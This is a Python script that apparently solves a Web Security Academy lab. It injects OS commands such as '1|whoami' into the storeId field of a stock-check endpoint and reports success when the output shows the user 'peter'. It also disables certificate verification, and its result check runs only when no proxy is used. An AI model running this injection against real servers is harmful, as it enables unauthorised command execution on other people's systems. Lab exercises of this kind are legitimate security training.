#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""OS Command Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "1|whoami" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "1|whoami" 

Example solutions: 1|whoami, 1;whoami
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: 1|whoami', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def cmd_inj(url, command):
    path = '/product/stock'
    data = {
        "productId": "1",
        "storeId": command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = requests.post(url + path, data=data, verify=False, proxies=proxies)
    else:
        r = requests.post(url + path, data=data, verify=False)
        # verify the response contains peter username
        if (b'peter' in r.content):
            print("You are the user: ")
            user = r.content.decode("utf-8").rstrip('\n')
            print(user)
            print("(+) OS Command Injection Successful!")
        else:
            print("(-) OS Command Injection Failed")

def main():
    
    print("(+) Exploiting OS Command Injection")
        
    cmd_inj(url, command)

if __name__ == "__main__":
    main()
